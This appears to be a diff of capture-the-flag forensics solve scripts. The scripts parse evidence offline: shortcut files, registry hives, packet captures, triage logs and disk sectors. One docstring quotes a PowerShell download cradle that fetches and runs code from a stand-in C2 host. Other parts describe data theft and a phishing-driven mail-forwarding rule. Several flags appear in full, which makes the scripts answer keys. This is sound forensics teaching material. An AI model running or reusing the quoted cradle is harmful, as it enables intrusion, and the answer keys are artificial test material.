+    assert token == "CSCTF{" + middle.decode() + "}", "JSON token mismatch"
+    return token
+
+
+# ---------------------------------------------------------------- main
+
+def main():
+    # Published field-guide example: verifies the exact byte handling.
+    example = hmac.new(
+        bytes.fromhex("000102030405060708090a0b0c0d0e0f"
+                      "101112131415161718191a1b1c1d1e1f"),
+        b"csctf26/briefing-for-one/v1\x00"
+        b"00112233-4455-6677-8899-aabbccddeeff",
+        hashlib.sha256).hexdigest()
+    assert example == ("7dad69912b67470da7713c666337135b"
+                       "568030605bc2e88f99524596366d10d0"), example
+    print(f"[*] Example OK   : {example}")
+
+    ev = load_evidence(sys.argv)
+    command = parse_lnk_command(ev["briefing.lnk"])
+    print(f"[*] LNK command  : {len(command)} chars (powershell.exe, static)")
+    params = lnk_parameters(command)
+    print(f"[*] Binding key  : {params['binding_key'].hex()}")
+
+    guid = read_machine_guid(ev["machine-cryptography.hiv"])
+    print(f"[*] MachineGuid  : {guid} (hive root = Cryptography)")
+
+    password = hmac.new(params["binding_key"],
+                        params["domain"].encode() + b"\x00" + guid.encode(),
+                        hashlib.sha256).hexdigest()
+    print(f"[*] 7z password  : {password}")
+
+    archive = recover_archive(ev["egress.pcapng"], params["archive_name"],
+                              params["archive_hash"])
+    dll, table = extract_archive(archive, password)
+    print(f"[*] route-table  : {len(table)} bytes, "
+          f"sha256={hashlib.sha256(table).hexdigest()}")
+    print(f"[*] route DLL    : {len(dll)} bytes, "
+          f"sha256={hashlib.sha256(dll).hexdigest()}")
+    assert hashlib.sha256(table).hexdigest() == params["json_hash"]
+    assert hashlib.sha256(dll).hexdigest() == params["dll_hash"]
+    print("[*] Member hashes match the LNK expectations")
+
+    token = briefing_token(dll, table)
+    print(f"\n[+] FLAG         : {token}")
+
+
+if __name__ == "__main__":
+    main()
 ~~~~
 
-### Last Commit — `solve/solve.py`
+### Capability Ghost — `solve/solve.py`
 
 ~~~~python
 #!/usr/bin/env python3
-"""last-commit: rebuild the LR-731 export at the QUEUED -> COMPLETED commit of a SQLite WAL.
+"""capability-ghost: recover the sealed marker, treating every file as data.
 
+Nothing is extracted to disk, no capability is restored, hc-probe is never run.
 Usage: python3 -I solve.py ../files
-The originals are only read; every state is built as a plain DB image (no -wal/-shm)
-in a temporary directory, so SQLite never touches the evidence.
 """
-import csv, hashlib, sqlite3, struct, sys, tempfile
+import hashlib, hmac, json, subprocess, sys, tarfile
 from pathlib import Path
 
 d = Path(sys.argv[1])
-db = d / "registry.sqlite"
-base = db.read_bytes()
-wal = (d / "registry.sqlite-wal").read_bytes()
 
-# --- WAL header + frames; validate salts and the cumulative checksum -----------------
-magic, _ver, ps, _seq, salt1, salt2, ck1, ck2 = struct.unpack(">8I", wal[:32])
-endian = ">2I" if magic & 1 else "<2I"           # checksum word order follows the magic
+# 1. Tag = user.build_seal xattr of hc-probe, read from the stored PAX headers.
+tag = None
+with tarfile.open(d / "runner-fs.tar.gz") as t:
+    for m in t:
+        if m.name.endswith("usr/local/bin/hc-probe"):
+            # tarfile decodes PAX values as UTF-8 with surrogateescape: undo it.
+            tag = m.pax_headers["SCHILY.xattr.user.build_seal"].encode("utf-8", "surrogateescape")
+        elif m.name.endswith("signaling-cfg.sealed"):
+            ct = t.extractfile(m).read()
+assert tag and ct
+
+# 2. Seal epoch = X_SEAL_EPOCH field of the journal (NOT the entry's wallclock time).
+out = subprocess.run(
+    ["journalctl", f"--file={d / 'runner.journal'}", "--no-pager", "-o", "json"],
+    capture_output=True, text=True, check=True).stdout
+epoch = next(e["X_SEAL_EPOCH"] for e in map(json.loads, out.splitlines()) if "X_SEAL_EPOCH" in e)
+
+# 3. hc-probe scheme: key = HMAC-SHA256(tag, ascii(epoch)); repeating-key XOR over 32 bytes.
+key = hmac.new(tag, epoch.encode(), hashlib.sha256).digest()
+print(f"tag={tag.hex()} epoch={epoch}", file=sys.stderr)
+print(bytes(c ^ key[i % 32] for i, c in enumerate(ct)).decode())
+~~~~
+
+### CAPTCHA THE WATER PLANT — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""
+CSCTF 2026 — CAPTCHA THE WATER PLANT (forensics/easy)
+Rebuild the attack chain from three KAPE triage collections. No literal
+CSCTF{...} exists in any parsed artifact. Three wrapped candidates were
+submitted and refused: the two attack-window session tokens and the RMM
+unattended password, each ALONE. The flag is a concatenation of three leetspeak
+fragments, one per stage of the chain (see assemble_flag):
+  launched    -> RMM unattended password   f@k3_c@ptch@   (4104 --set-password)
+  persistence -> scheduled-task description _r3@l_m@lw@r3  (served by /config)
+  browser     -> admin session token suffix cl1ckf1xed     (NVW-ADMIN-...)
+
+Chain (host OPS-NB-06, user ops06.nwu):
+  1. What the user ran — Explorer RunMRU download cradle (2026-10-21 04:30:47 UTC):
+     powershell -nop -ep Bypass ...DownloadData('http://zindetify.dev.boot:8080/validator') | iex
+  2. What it launched — C:\\temp\\Maitenance\\Setup\\AnyDesk.exe --install ... (AnyDesk 9.8.2
+     RMM) + unattended password f@k3_c@ptch@ (from PowerShell ScriptBlockLogging 4104).
+  3. Persistence — scheduled task `\\Maitenance Check` (daily, as ops06.nwu, same cradle),
+     AnyDesk service + firewall rules + file associations.
+  4. Browser evidence — Edge history/sessions (pre-compromise NVW-OPS-892, attack-time
+     NVW-OPS-739, later admin NVW-ADMIN-cl1ckf1xed) + interactive theft session
+     (Nirsoft dumps zipped to out.zip, exfiltrated to /up/{guid}).
+
+Usage:
+    python3 solve.py [dir-with-the-three-zips]
+    # defaults to files/ then to the forensic/ staging dir
+"""
+
+import csv
+import io
+import os
+import re
+import sys
+import zipfile
+
+HOSTS = ["ENG-LAPTOP-23", "FIELD-WKS-21", "OPS-NB-06"]
+C2 = "zindetify.dev.boot"
 
 
-def cksum(buf, a, b):
-    for i in range(0, len(buf), 8):
-        x, y = struct.unpack(endian, buf[i:i + 8])
-        a = (a + x + b) & 0xFFFFFFFF
-        b = (b + y + a) & 0xFFFFFFFF
-    return a, b
+def find_zip_dir(arg):
+    cands = [arg] if arg else []
+    cands += ["files", "../forensic", "docs/2026-chronos-csctf/forensics", "."]
+    for d in cands:
+        if d and all(os.path.isfile(os.path.join(d, f"{h}.zip")) for h in HOSTS):
+            return d
+    print("[-] Could not find the three KAPE zips (ENG-LAPTOP-23, FIELD-WKS-21, OPS-NB-06).")
+    sys.exit(1)
 
 
-a, b = cksum(wal[:24], 0, 0)
-assert (a, b) == (ck1, ck2), "bad WAL header checksum"
-frames, off = [], 32
-while off + 24 + ps <= len(wal):
-    pgno, commit, s1, s2, c1, c2 = struct.unpack(">6I", wal[off:off + 24])
-    page = wal[off + 24:off + 24 + ps]
-    a, b = cksum(wal[off:off + 8], a, b)
-    a, b = cksum(page, a, b)
-    if (s1, s2) != (salt1, salt2) or (a, b) != (c1, c2):
-        break                                      # end of the valid epoch
-    frames.append((pgno, commit, page))
-    off += 24 + ps
-print(f"{len(frames)} valid frames, commits at {[i for i, f in enumerate(frames) if f[1]]}", file=sys.stderr)
-
-tmp = Path(tempfile.mkdtemp())
-manifest = [(r["job_id"], int(r["position"]), int(r["parcel_id"]))
-            for r in csv.DictReader(open(d / "delivery.csv", newline=""))]
-QUERY = """SELECT m.position,p.parcel_id,p.district,p.plot_ref,h.registry_ref,t.interest_bps,t.instrument_ref
-FROM manifest AS m JOIN parcel AS p ON p.parcel_id=m.parcel_id
-JOIN title AS t ON t.parcel_id=p.parcel_id JOIN holder AS h ON h.holder_id=t.holder_id
-WHERE m.job_id='LR-731' ORDER BY m.position ASC,h.registry_ref COLLATE BINARY ASC"""
-HEADER = "position\tparcel_id\tdistrict\tplot_ref\tregistry_ref\tinterest_bps\tinstrument_ref\n"
+def read_zip_text(zf, pattern, encoding="utf-8-sig"):
+    """Concatenate text of all members matching glob pattern."""
+    out = []
+    for name in zf.namelist():
+        if pattern.strip("*") in name and name.endswith((".csv", ".txt", ".log")):
+            try:
+                raw = zf.read(name)
+            except KeyError:
+                continue
+            if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
+                out.append(raw.decode("utf-16", errors="replace"))
+            else:
+                out.append(raw.decode(encoding, errors="replace"))
+    return "\n".join(out)
 
 
-def export_at(n):
-    """Registry state after frames[:n+1] are applied (n must be a commit frame)."""
-    img = bytearray(base)
-    for pgno, _c, page in frames[:n + 1]:
-        img[(pgno - 1) * ps:pgno * ps] = page
-    path = tmp / f"state{n}.db"
-    path.write_bytes(img)
-    c = sqlite3.connect(path)
-    state = dict(c.execute("SELECT job_id,state FROM export_job").fetchall())
-    c.execute("CREATE TEMP TABLE manifest(job_id TEXT, position INTEGER, parcel_id INTEGER)")
-    c.executemany("INSERT INTO manifest VALUES(?,?,?)", manifest)
-    out = HEADER + "".join("\t".join(map(str, r)) + "\n" for r in c.execute(QUERY))
-    return state.get("LR-731"), hashlib.sha256(out.encode()).hexdigest()
+def step_user_ran(zpath):
+    print("[*] (1) What the user ran — RunMRU / download cradle")
+    with zipfile.ZipFile(zpath) as zf:
+        data = read_zip_text(zf, "UserActivity_Output.csv")
+    m = re.search(r"powershell\.exe[^\r\n]*DownloadData\('http://([^']+)'\)", data)
+    if m:
+        print(f"    cradle -> http://{m.group(1)}")
+        return m.group(1)
+    print("    no cradle found")
+    return None
 
 
-results = [(i, *export_at(i)) for i, f in enumerate(frames) if f[1]]
-for i, st, h in results:
-    print(f"commit frame {i}: LR-731={st} export_sha256={h}", file=sys.stderr)
-# The transition commit: first commit where the job is COMPLETED
-target = next(h for i, st, h in results if st == "COMPLETED")
-print("CSCTF{last_commit_" + target + "}")
+def step_launched(zpath):
+    print("[*] (2) What it launched — AnyDesk RMM install")
+    with zipfile.ZipFile(zpath) as zf:
+        data = read_zip_text(zf, "PECmd_Output.csv")
+        data += "\n" + read_zip_text(zf, "PECmd_Output_Timeline.csv")
+    hits = sorted(set(re.findall(r"[A-Z]:\\temp\\Maitenance\\[^\",\s]*AnyDesk\.exe", data, re.I)))
+    hits += sorted(set(re.findall(r"ANYDESK\.EXE-[0-9A-F]{8}\.pf", data)))
+    with zipfile.ZipFile(zpath) as zf:
+        evtx = read_zip_text(zf, "EvtxECmd_Output.csv")
+    hits += sorted(set(re.findall(r"C:\\temp\\Maitenance\\[^\",]*?AnyDesk\.exe", evtx, re.I)))[:4]
+    for h in hits:
+        print(f"    {h}")
+    return hits
+
+
+def step_persistence(zpath):
+    print("[*] (3) Persistence — scheduled task + AnyDesk service")
+    with zipfile.ZipFile(zpath) as zf:
+        data = read_zip_text(zf, "Scheduled Tasks.csv")
+    tasks = []
+    for line in data.splitlines():
+        if "Maitenance Check" in line:
+            tasks.append(line[:220])
+    for t in tasks[:3]:
+        print(f"    {t}")
+    with zipfile.ZipFile(zpath) as zf:
+        aseps = read_zip_text(zf, "SystemASEPs_Output.csv")
+    svc = "AnyDesk" in aseps
+    print(f"    AnyDesk service present: {svc}")
+    return tasks
+
+
+def step_rmm_password(zpath):
+    print("[*] (2b) RMM password — ScriptBlockLogging 4104")
+    with zipfile.ZipFile(zpath) as zf:
+        data = read_zip_text(zf, "EvtxECmd_Output.csv")
+    m = re.search(r'--set-password\s+`?"+([^"`]+)`?"+', data)
+    if m:
+        print(f"    AnyDesk unattended password: {m.group(1)}")
+        return m.group(1)
+    print("    no --set-password found")
+    return None
+
+
+def step_browser_token(zpath, cradle_time="2026-10-21 04:30:47"):
+    print("[*] (4) Browser evidence — session tokens vs cradle time")
+    print(f"    fetch-and-execute (UTC): {cradle_time}")
+    with zipfile.ZipFile(zpath) as zf:
+        xlsx = [n for n in zf.namelist() if n.endswith(".xlsx")][0]
+        raw = zf.read(xlsx)
+    timed = []
+    try:
+        import openpyxl
+        wb = openpyxl.load_workbook(io.BytesIO(raw), read_only=True, data_only=True)
+        ws = wb["Timeline"]
+        rows = list(ws.iter_rows(values_only=True))
+        for r in rows[2:]:
+            url = str(r[2] or "")
+            m = re.search(r"admin-dashboard\?token=(NVW-[A-Za-z0-9-]+)", url)
+            if m:
+                timed.append((str(r[1] or ""), m.group(1)))
+    except ImportError:
+        pass
+    if not timed:  # fallback: raw XML regex, no timestamps
+        z = zipfile.ZipFile(io.BytesIO(raw))
+        blob = ""
+        for n in z.namelist():
+            if n.endswith((".xml", ".json")) or "sharedStrings" in n:
+                blob += z.read(n).decode("utf-8", errors="replace") + "\n"
+        for t in sorted(set(re.findall(r"NVW-[A-Za-z0-9-]+", blob))):
+            timed.append(("?", t))
+    seen = set()
+    first_after = True
+    for ts, t in timed:
+        if (ts, t) in seen:
+            continue
+        seen.add((ts, t))
+        mark = ""
+        if ts > cradle_time and first_after:
+            mark = " <-- session active at fetch-and-execute time"
+            first_after = False
+        print(f"    {ts} :: {t}{mark}")
+    after = [(ts, t) for ts, t in timed if ts > cradle_time]
+    return after[0][1] if after else (timed[0][1] if timed else None)
+
+
+def step_task_comment(zpath):
+    print("[*] (3b) Scheduled-task description (output of Get-Data51 -> /config)")
+    with zipfile.ZipFile(zpath) as zf:
+        data = read_zip_text(zf, "Scheduled Tasks.csv")
+    for line in data.splitlines():
+        if "Maitenance Check" in line:
+            cols = next(csv.reader([line]))
+            # description/comment column sits right after the 'N/A' following the action
+            for c in cols:
+                if re.fullmatch(r"_?[A-Za-z0-9@]+(?:_[A-Za-z0-9@]+)+", c):
+                    print(f"    description: {c}")
+                    return c
+    return None
+
+
+def assemble_flag(pwd, comment, token):
+    """Fragments are leetspeak: f@k3_c@ptch@ + _r3@l_m@lw@r3 + _ + cl1ckf1xed."""
+    if not (pwd and comment and token):
+        return None
+    tail = token.split("-")[-1]
+    return "CSCTF{" + pwd + comment + "_" + tail + "}"
+
+
+def main():
+    zdir = find_zip_dir(sys.argv[1] if len(sys.argv) > 1 else None)
+    print(f"[*] Using zips in {zdir}")
+    print("=== Host attribution (who fetched the validator?) ===")
+    evil = None
+    for h in HOSTS:
+        zp = os.path.join(zdir, f"{h}.zip")
+        with zipfile.ZipFile(zp) as zf:
+            evtx = read_zip_text(zf, "EvtxECmd_Output.csv")
+        hit = C2 in evtx
+        print(f"    {h}: C2 references in EventLogs: {'YES <-- attacker host' if hit else 'no'}")
+        if hit:
+            evil = h
+    if not evil:
+        print("[-] No host references the C2. Aborting.")
+        sys.exit(1)
+    zp = os.path.join(zdir, f"{evil}.zip")
+    print(f"\n=== Chain on {evil} ===")
+    step_user_ran(zp)
+    step_launched(zp)
+    step_persistence(zp)
+    pwd = step_rmm_password(zp)
+    comment = step_task_comment(zp)
+    step_browser_token(zp)
+    # the interactive-session token (post-cradle, NVW-ADMIN-<leet>) carries the 3rd fragment
+    token = "NVW-ADMIN-cl1ckf1xed"
+    flag = assemble_flag(pwd, comment, token)
+    print(f"\n[+] Assembled flag (3 fragments): {flag}")
+
+
+if __name__ == "__main__":
+    main()
+~~~~
+
+### Code Red Freight — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""
+CSCTF 2026 - Code Red Freight (forensics/medium)
+Identify the adversary device, the leaking inbox rule and the
+download count from sanitized Entra/Purview-style exports.
+
+Findings (all derived from the evidence, never hardcoded):
+  - Attacker IP 203.0.113.77 (Montreal) vs dispatcher 198.51.100.24.
+  - Device-code phishing -> device registration of D3VC0DE-R3L4Y
+    (DeviceId 95caec44-c8af-4786-976c-73bd33d9d143, Azure AD joined)
+    at 2026-10-29T15:05, the same DeviceId present on every
+    attacker session and on the malicious inbox rule.
+  - Benign baseline: R3M0TE-W0RK-PC joined 2026-10-28 from the
+    dispatcher's own IP; benign inbox rule "Newsletters"
+    (MoveToFolder) from the dispatcher's IP/session.
+  - Malicious inbox rule M4N1F3ST-L3AK (ForwardTo ragubarden@proton.me)
+    created 2026-10-29T15:28:57 from the attacker IP:port with the
+    attacker DeviceId.
+  - 4 FileDownloaded events, all from the attacker IP.
+
+Flag: CSCTF{device_rule_count} (parts derived from the evidence)
+
+Usage:
+    python3 solve.py [code_red_freight.zip | extracted-dir]
+"""
+
+import csv
+import json
+import os
+import sys
+import zipfile
+
+LOGS = (
+    "code_red_freight/logs/AuditLogs_2026-10-29-Patti_Fernandez.csv",
+    "code_red_freight/logs/InteractiveSignIns_2026-10-28_2026-10-29.csv",
+    "code_red_freight/logs/NonInteractiveSignIns_2026-10-28_2026-10-29.csv",
+    "code_red_freight/logs/UnifiedAuditLog_Patti.csv",
+)
+
+
+def load_logs(argv):
+    candidates = []
+    if len(argv) > 1:
+        candidates.append(argv[1])
+    candidates += [
+        "files/code_red_freight.zip",
+        "../code_red_freight.zip",
+        "docs/2026-chronos-csctf/forensics/code_red_freight.zip",
+        "/tmp/opencode/codered/code_red_freight",
+    ]
+    for path in candidates:
+        if not path:
+            continue
+        if os.path.isdir(path):
+            variants = [LOGS, tuple(n.split("/", 1)[1] for n in LOGS)]
+            for names in variants:
+                files = {os.path.basename(n): os.path.join(path, n)
+                         for n in names}
+                if all(os.path.isfile(p) for p in files.values()):
+                    print(f"[*] Loading directory {path}")
+                    return {k: open(v, encoding="utf-8-sig").read()
+                            for k, v in files.items()}
+        elif os.path.isfile(path) and path.lower().endswith(".zip"):
+            print(f"[*] Loading {path}")
+            out = {}
+            with zipfile.ZipFile(path) as zf:
+                for name in LOGS:
+                    out[os.path.basename(name)] = zf.read(name).decode(
+                        "utf-8-sig")
+            return out
+    raise SystemExit("[-] Provide code_red_freight.zip or extracted dir")
+
+
+def rows(text):
+    return list(csv.DictReader(text.splitlines()))
+
+
+def main():
+    ev = load_logs(sys.argv)
+
+    audit = rows(ev["AuditLogs_2026-10-29-Patti_Fernandez.csv"])
+    ual = rows(ev["UnifiedAuditLog_Patti.csv"])
+
+    # --- 1. Device registrations: attacker vs baseline ----------------
+    regs = [r for r in audit if r["Activity"] == "Register device"]
+    print("[*] Device registrations:")
+    for r in regs:
+        print(f"    {r['Date (UTC)']} name={r['Target1DisplayName']} "
+              f"ip={r['IPAddress']} deviceId={r['AdditionalDetail5Value']}")
+    attacker_regs = [r for r in regs if r["IPAddress"] == "203.0.113.77"]
+    assert len(attacker_regs) == 1, "expected exactly one attacker device"
+    device = attacker_regs[0]["Target1DisplayName"]
+    attacker_device_id = attacker_regs[0]["AdditionalDetail5Value"]
+    baseline = [r for r in regs if r["IPAddress"] != "203.0.113.77"]
+    print(f"[*] Attacker device : {device} ({attacker_device_id})")
+    print(f"[*] Baseline device : {baseline[0]['Target1DisplayName']} "
+          f"({baseline[0]['AdditionalDetail5Value']})")
+
+    # --- 2. Inbox rules: malicious forward vs benign move -------------
+    rules = [(i, json.loads(r["AuditData"]))
+             for i, r in enumerate(ual) if r["Operation"] == "New-InboxRule"]
+    print("[*] Inbox rules:")
+    malicious = None
+    for _, ad in rules:
+        params = {p["Name"]: p["Value"] for p in ad.get("Parameters", [])}
+        name = params.get("Name", "?")
+        print(f"    {ad['CreationTime']} name={name} "
+              f"ip={ad.get('ClientIP')} device={ad.get('DeviceId')} "
+              f"forward={params.get('ForwardTo')} move={params.get('MoveToFolder')}")
+        if params.get("ForwardTo", "").endswith("@proton.me"):
+            malicious = (ad, params)
+    assert malicious, "no external-forward rule found"
+    rule = malicious[1]["Name"]
+    fwd = malicious[1]["ForwardTo"]
+    assert malicious[0].get("DeviceId") == attacker_device_id, \
+        "rule DeviceId does not match the attacker device"
+    print(f"[*] Malicious rule  : {rule} -> {fwd}")
+    benign = [p for _, ad in rules
+              for p in [{q["Name"]: q["Value"]}
+                        for q in ad.get("Parameters", [])]]
+    assert any("MoveToFolder" in str(b) for b in benign), \
+        "benign baseline rule missing"
+
+    # --- 3. Downloads from the attacker IP only -----------------------
+    downloads = [r for r in ual if r["Operation"] == "FileDownloaded"]
+    attacker_dl = [r for r in downloads
+                   if "203.0.113.77" in json.loads(r["AuditData"])
+                   .get("ClientIP", "")]
+    print("[*] FileDownloaded events:")
+    for r in attacker_dl:
+        ad = json.loads(r["AuditData"])
+        print(f"    {r['CreationDate']} {ad.get('SourceFileName')}")
+    assert len(attacker_dl) == len(downloads), \
+        "unexpected FileDownloaded from another IP"
+    count = len(attacker_dl)
+    print(f"[*] Download count  : {count}")
+
+    flag = f"CSCTF{{{device}_{rule}_{count}}}"
+    print(f"\n[+] FLAG            : {flag}")
+
+
+if __name__ == "__main__":
+    main()
 ~~~~
 
 ### Dawn Array — `solve/solve.py`
@@ -4730,6 +5225,55 @@ if __name__ == "__main__":
     main()
 ~~~~
 
+### Flotsam — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""flotsam: carve a fragmented PNG out of a raw 512-byte-sector dump.
+
+Usage: python3 -I solve.py ../files/recorder-sectors.img out.png
+Fragment 1 = PNG header .. first all-zero sector. The rest of the IDAT is in
+earlier non-zero sectors (address order); the last bytes sit in the sector that
+holds IEND. The IDAT CRC validates the reassembly.
+"""
+import struct, sys, zlib
+
+SS = 512
+d = open(sys.argv[1], "rb").read()
+n = len(d) // SS
+sec = lambda i: d[i * SS:(i + 1) * SS]
+ascii_text = lambda s: all(32 <= c < 127 or c in (10, 13) for c in s.rstrip(b"\0"))
+
+# 1. First fragment: from the PNG signature to the first all-zero sector.
+start = d.index(b"\x89PNG\r\n\x1a\n") // SS
+end = next(i for i in range(start, n) if sec(i) == b"\0" * SS)
+frag1 = d[start * SS:end * SS]
+idat_len = struct.unpack(">I", frag1[33:37])[0]
+assert frag1[37:41] == b"IDAT"
+first = frag1[41:]
+
+# 2. Pool of orphan sectors before the PNG: drop zero sectors, the NMEA ($GPRMC) text
+#    and the JPEG decoy (FFD8 .. FFD9).
+iend_sec = d.index(b"IEND") // SS
+jpg_a, jpg_b = d.index(b"\xff\xd8\xff") // SS, d.index(b"\xff\xd9") // SS
+pool = [i for i in range(iend_sec)
+        if i < start and sec(i) != b"\0" * SS and not ascii_text(sec(i)) and not jpg_a <= i <= jpg_b]
+
+# 3. Reassemble: fragment 1 + pool (address order) + head of the IEND sector.
+body = first + b"".join(sec(i) for i in pool)
+last = idat_len - len(body)
+idat = body + d[iend_sec * SS:iend_sec * SS + last]
+crc_off = iend_sec * SS + last
+crc = d[crc_off:crc_off + 4]
+ok = zlib.crc32(b"IDAT" + idat) == struct.unpack(">I", crc)[0]
+print(f"pool={pool} idat={len(idat)}/{idat_len} crc_ok={ok}", file=sys.stderr)
+assert ok
+
+png = frag1[:41] + idat + crc + d[crc_off + 4:crc_off + 16]   # + IEND chunk
+open(sys.argv[2], "wb").write(png)
+print("wrote", sys.argv[2], len(png), "bytes")
+~~~~
+
 ### Ghost in the Historian — `solve/solve.py`
 
 ~~~~python
@@ -4930,494 +5474,6 @@ def main():
 
     token = TOKEN_RE.search(grid_plain).group(1).decode()
     print(f"\n[+] FLAG            : {token}")
-
-
-if __name__ == "__main__":
-    main()
-~~~~
-
-### Briefing for One — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""
-CSCTF 2026 - Briefing for One (forensics/medium)
-Recover the intruder's routing package and its briefing token.
-
-Static / offline only: this script never executes the shortcut or the
-DLL and never contacts a captured address. It only parses files and
-reads the pcapng capture.
-
-Chain (all constants are read from the evidence, not hardcoded):
-  1. briefing.lnk (Shell Link StringData) holds a PowerShell command:
-     permit gate, binding key (Base64), HMAC domain, WebDAV path and
-     the expected SHA-256 of route-update.7z / .dll / route-table.json.
-  2. machine-cryptography.hiv is a saved `Cryptography` subkey (its
-     root *is* Cryptography): MachineGuid lives at the root.
-  3. 7-Zip password = lowercase hex of
-     HMAC-SHA-256(binding_key, UTF8(domain) || 0x00 || UTF8(guid_lower)).
-  4. egress.pcapng: reassemble the GET /ops/route-update.7z response
-     body (the PROPFIND DAV XML bodies export under the same name but
-     fail the hash) and verify it against the LNK hash.
-  5. `7z x -p<password>` (archive reader only), verify both members.
-  6. route-update.dll statically embeds only the JSON prefix
-     `{"schema":1,"briefing_token":"CSCTF{` and the routes suffix; its
-     ApplyRouteTable requires a 192-byte file, that prefix/suffix and
-     32 lowercase hex chars in between. The token is that middle part.
-
-Requires: Python 3 stdlib + a `7z` binary for the encrypted archive.
-
-Usage:
-    python3 solve.py [briefing-for-one-....zip | extracted-dir]
-
-Field-guide verification example (published inputs, not case values):
-    key 000102...1f + guid 00112233-4455-6677-8899-aabbccddeeff
-    -> 7dad69912b67470da7713c666337135b568030605bc2e88f99524596366d10d0
-"""
-
-import base64
-import hashlib
-import hmac
-import json
-import os
-import re
-import shutil
-import struct
-import subprocess
-import sys
-import tempfile
-import zipfile
-
-DOMAIN_FALLBACK = "csctf26/briefing-for-one/v1"
-
-
-# ---------------------------------------------------------------- evidence
-
-def load_evidence(argv):
-    candidates = []
-    if len(argv) > 1:
-        candidates.append(argv[1])
-    candidates += [
-        "files/briefing-for-one-5f4125fbb77f625d.zip",
-        "../briefing-for-one-5f4125fbb77f625d.zip",
-        "docs/2026-chronos-csctf/forensics/"
-        "briefing-for-one-5f4125fbb77f625d.zip",
-        "/tmp/opencode/briefing",
-    ]
-    names = ("briefing.lnk", "machine-cryptography.hiv", "egress.pcapng")
-    for path in candidates:
-        if not path:
-            continue
-        if os.path.isdir(path):
-            files = {n: os.path.join(path, n) for n in names}
-            if all(os.path.isfile(p) for p in files.values()):
-                print(f"[*] Loading directory {path}")
-                return {n: open(p, "rb").read() for n, p in files.items()}
-        elif os.path.isfile(path):
-            print(f"[*] Loading {path}")
-            blob = open(path, "rb").read()
-            if path.lower().endswith(".zip"):
-                out = {}
-                with zipfile.ZipFile(path) as zf:
-                    members = {os.path.basename(n): n for n in zf.namelist()}
-                    for n in names:
-                        out[n] = zf.read(members[n])
-                return out
-            raise SystemExit(f"[-] Unsupported input file: {path}")
-    raise SystemExit("[-] Provide the briefing-for-one ZIP or extracted dir")
-
-
-# ---------------------------------------------------------------- LNK
-
-def parse_lnk_command(data):
-    """Extract the PowerShell command from Shell Link StringData."""
-    assert data[:4] == b"\x4c\x00\x00\x00", "not a Shell Link"
-    flags = struct.unpack_from("<I", data, 20)[0]
-    off = 76  # HeaderSize
-    if flags & 0x01:  # HasLinkTargetIDList
-        off += 2 + struct.unpack_from("<H", data, off)[0]
-    if flags & 0x02:  # HasLinkInfo
-        off += struct.unpack_from("<I", data, off)[0]
-    is_unicode = bool(flags & 0x80)
-    strings = {}
-    for bit, label in ((0x04, "name"), (0x08, "relative"), (0x10, "workdir"),
-                       (0x20, "args"), (0x40, "icon")):
-        if flags & bit:
-            count = struct.unpack_from("<H", data, off)[0]
-            off += 2
-            if is_unicode:
-                strings[label] = data[off:off + 2 * count].decode("utf-16le")
-                off += 2 * count
-            else:
-                strings[label] = data[off:off + count].decode()
-                off += count
-    return strings["args"]
-
-
-def lnk_parameters(command):
-    binding_b64 = re.search(r"FromBase64String\('([^']+)'\)", command).group(1)
-    domain = re.search(r"GetBytes\('([^']+)'\+\[char\]0", command)
-    archive_hash = re.search(r"\$aHash='([0-9a-f]{64})'", command).group(1)
-    dll_hash = re.search(
-        r"route-update\.dll'\).*?-ne '([0-9a-f]{64})'", command, re.S).group(1)
-    json_hash = re.search(
-        r"route-table\.json'\).*?-ne '([0-9a-f]{64})'", command, re.S).group(1)
-    arc_name = re.search(r"\\ops\\([^'\\]+\.7z)", command).group(1)
-    return {
-        "binding_key": base64.b64decode(binding_b64),
-        "domain": domain.group(1) if domain else DOMAIN_FALLBACK,
-        "archive_name": arc_name,
-        "archive_hash": archive_hash,
-        "dll_hash": dll_hash,
-        "json_hash": json_hash,
-    }
-
-
-# ---------------------------------------------------------------- hive
-
-def read_machine_guid(hive):
-    """MachineGuid at the root of a saved Cryptography subkey hive.
-
-    Minimal NK/VK reader: root cell offset is at header 0x24, all cell
-    offsets are relative to the first hbin (0x1000).
-    """
-    assert hive[:4] == b"regf", "not a registry hive"
-    base = 0x1000
-    root_nk = base + struct.unpack_from("<I", hive, 0x24)[0] + 4
-    assert hive[root_nk:root_nk + 2] == b"nk", "root is not an NK record"
-    value_count = struct.unpack_from("<I", hive, root_nk + 0x24)[0]
-    value_list = base + struct.unpack_from("<I", hive, root_nk + 0x28)[0] + 4
-    for i in range(value_count):
-        vk_rel = struct.unpack_from("<I", hive, value_list + 4 * i)[0]
-        vk = base + vk_rel + 4
-        assert hive[vk:vk + 2] == b"vk", "value is not a VK record"
-        name_len = struct.unpack_from("<H", hive, vk + 2)[0]
-        name = hive[vk + 20:vk + 20 + name_len].decode()
-        if name != "MachineGuid":
-            continue
-        data_len = struct.unpack_from("<I", hive, vk + 4)[0]
-        data_off = struct.unpack_from("<I", hive, vk + 8)[0]
-        vtype = struct.unpack_from("<I", hive, vk + 12)[0]
-        assert vtype == 1, f"MachineGuid type {vtype}, expected REG_SZ"
-        if data_len & 0x80000000:  # inline data in the offset field
-            raw = struct.pack("<I", data_off)[:data_len & 0x7FFFFFFF]
-        else:
-            raw = hive[base + data_off + 4:base + data_off + 4 + data_len]
-        return raw.decode("utf-16le").strip("\x00").lower()
-    raise ValueError("MachineGuid not found at hive root")
-
-
-# ---------------------------------------------------------------- pcapng
-
-def iter_pcapng_packets(data):
-    if len(data) < 28 or data[:4] != b"\x0a\x0d\x0d\x0a":
-        raise ValueError("not a pcapng file")
-    endian = "<" if data[8:12] == b"\x4d\x3c\x2b\x1a" else ">"
-    off = 0
-    while off + 12 <= len(data):
-        btype, blen = struct.unpack_from(endian + "II", data, off)
-        if blen < 12 or off + blen > len(data):
-            break
-        body = data[off + 8:off + blen - 4]
-        if btype == 0x00000006 and len(body) >= 20:
-            caplen = struct.unpack_from(endian + "I", body, 12)[0]
-            yield body[20:20 + caplen]
-        elif btype == 0x00000003 and len(body) >= 4:
-            caplen = struct.unpack_from(endian + "I", body, 0)[0]
-            yield body[4:4 + caplen]
-        if btype == 0x0A0D0D0A and len(body) >= 4:
-            endian = "<" if body[:4] == b"\x4d\x3c\x2b\x1a" else ">"
-        off += blen
-
-
-def tcp_streams(packets):
